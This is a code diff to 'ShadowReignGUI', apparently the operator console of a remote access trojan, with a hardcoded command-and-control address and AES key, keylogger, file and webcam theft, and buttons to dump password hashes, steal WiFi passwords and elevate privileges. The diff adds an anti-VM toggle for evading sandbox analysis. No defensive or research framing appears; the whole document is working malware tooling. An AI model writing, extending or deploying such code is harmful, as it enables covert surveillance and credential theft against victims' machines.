@@ -22,18 +22,16 @@ class ShadowReignGUI:
         # C2 Config
         self.HOST = "192.168.1.133"
         self.PORT = 5251
-        self.KEY = b"ShadowReignBoss!"  # 16-byte AES key
+        self.KEY = b"ShadowReignBoss!"
         self.clients = {}
         self.selected_client = None
-        self.home_dir = os.path.expanduser("~")  # Home directory for saving files
+        self.home_dir = os.path.expanduser("~")
         
-        # GUI Setup
         self.setup_ui()
         self.start_server()
         self.root.mainloop()
 
     def setup_ui(self):
-        # Style Configuration
         style = ttk.Style()
         style.theme_use("clam")
         style.configure("TNotebook", background="#1e1e1e", borderwidth=0)
@@ -42,24 +40,24 @@ class ShadowReignGUI:
         style.configure("Treeview", background="#333333", foreground="white", fieldbackground="#333333", font=("Arial", 10))
         style.configure("Treeview.Heading", background="#2a2a2a", foreground="white", font=("Arial", 11, "bold"))
 
-        # Sidebar
         sidebar = tk.Frame(self.root, bg="#2a2a2a", width=300)
         sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)
         
         tk.Label(sidebar, text="Connected Clients", bg="#2a2a2a", fg="white", font=("Arial", 14, "bold")).pack(pady=5)
-        self.client_list = ttk.Treeview(sidebar, columns=("ID", "IP", "OS", "Status"), show="headings", height=10)
+        self.client_list = ttk.Treeview(sidebar, columns=("ID", "IP", "OS", "Status", "Anti-VM"), show="headings", height=10)
         self.client_list.heading("ID", text="ID")
         self.client_list.heading("IP", text="IP")
         self.client_list.heading("OS", text="OS")
         self.client_list.heading("Status", text="Status")
+        self.client_list.heading("Anti-VM", text="Anti-VM")
         self.client_list.column("ID", width=50)
         self.client_list.column("IP", width=100)
         self.client_list.column("OS", width=80)
         self.client_list.column("Status", width=60)
+        self.client_list.column("Anti-VM", width=60)
         self.client_list.pack(fill=tk.Y, pady=10)
         self.client_list.bind("<<TreeviewSelect>>", self.select_client)
         
-        # Main Panel
         self.main_frame = tk.Frame(self.root, bg="#1e1e1e")
         self.main_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
         
@@ -67,7 +65,6 @@ class ShadowReignGUI:
         self.notebook = ttk.Notebook(self.main_frame)
         self.notebook.pack(fill=tk.BOTH, expand=True)
         
-        # Feature Tabs
         self.tabs = {
             "Keylogger": self.create_keylogger_tab,
             "Files": self.create_files_tab,
@@ -108,7 +105,7 @@ class ShadowReignGUI:
         while True:
             try:
                 client_socket, addr = self.server.accept()
-                self.clients[client_id] = (client_socket, {"ip": addr[0], "os": "Unknown", "status": "Online"})
+                self.clients[client_id] = (client_socket, {"ip": addr[0], "os": "Unknown", "status": "Online", "anti_vm": False})
                 threading.Thread(target=self.handle_client, args=(client_id,), daemon=True).start()
                 client_id += 1
             except:
@@ -124,9 +121,11 @@ class ShadowReignGUI:
                 response = json.loads(self.decrypt(data))
                 self.clients[client_id][1].update(response)
                 self.client_list.delete(*[i for i in self.client_list.get_children() if self.client_list.item(i)["values"][0] == client_id])
-                self.client_list.insert("", "end", values=(client_id, self.clients[client_id][1]["ip"], self.clients[client_id][1]["os"], "Online"))
-                
-                # Handle received data
+                self.client_list.insert("", "end", values=(client_id, 
+                                                          self.clients[client_id][1]["ip"], 
+                                                          self.clients[client_id][1]["os"], 
+                                                          "Online", 
+                                                          "On" if self.clients[client_id][1]["anti_vm"] else "Off"))
                 if "keylogs" in response:
                     self.keylog_display.delete(1.0, tk.END)
                     self.keylog_display.insert(tk.END, response["keylogs"])
@@ -143,10 +142,16 @@ class ShadowReignGUI:
                     self.display_image(response["webcam"], "webcam_snap.jpg")
                 elif "file" in response:
                     self.save_to_file("downloaded_file", base64.b64decode(response["file"]), binary=True)
+                elif "status" in response:
+                    messagebox.showinfo("Status", response["status"])
             except:
                 self.clients[client_id][1]["status"] = "Offline"
                 self.client_list.delete(*[i for i in self.client_list.get_children() if self.client_list.item(i)["values"][0] == client_id])
-                self.client_list.insert("", "end", values=(client_id, self.clients[client_id][1]["ip"], self.clients[client_id][1]["os"], "Offline"))
+                self.client_list.insert("", "end", values=(client_id, 
+                                                          self.clients[client_id][1]["ip"], 
+                                                          self.clients[client_id][1]["os"], 
+                                                          "Offline", 
+                                                          "On" if self.clients[client_id][1]["anti_vm"] else "Off"))
                 break
 
     def save_to_file(self, filename, data, binary=False):
@@ -159,10 +164,10 @@ class ShadowReignGUI:
     def display_image(self, b64_data, filename):
         img_data = base64.b64decode(b64_data)
         img = Image.open(io.BytesIO(img_data))
-        img.thumbnail((400, 300))  # Resize for display
+        img.thumbnail((400, 300))
         photo = ImageTk.PhotoImage(img)
         self.media_display.configure(image=photo)
-        self.media_display.image = photo  # Keep reference
+        self.media_display.image = photo
         self.save_to_file(filename, img_data, binary=True)
 
     def select_client(self, event):
@@ -217,6 +222,12 @@ class ShadowReignGUI:
         tk.Button(tab, text="Dump Hashes", command=lambda: self.send_command("dump_hashes"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
         tk.Button(tab, text="Steal WiFi Passwords", command=lambda: self.send_command("steal_wifi"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
         tk.Button(tab, text="Elevate Privileges", command=lambda: self.send_command("elevate_privileges"), bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
+        tk.Button(tab, text="Toggle Anti-VM", command=self.toggle_anti_vm, bg="#ff4444", fg="white", font=("Arial", 10)).pack(pady=5)
+
+    def toggle_anti_vm(self):
+        if self.selected_client is not None:
+            current_state = self.clients[self.selected_client][1]["anti_vm"]
+            self.send_command("toggle_anti_vm", not current_state)
 
     def create_pranks_tab(self, tab):
         tk.Label(tab, text="Prank Controls", bg="#1e1e1e", fg="white", font=("Arial", 12, "bold")).pack(pady=5)
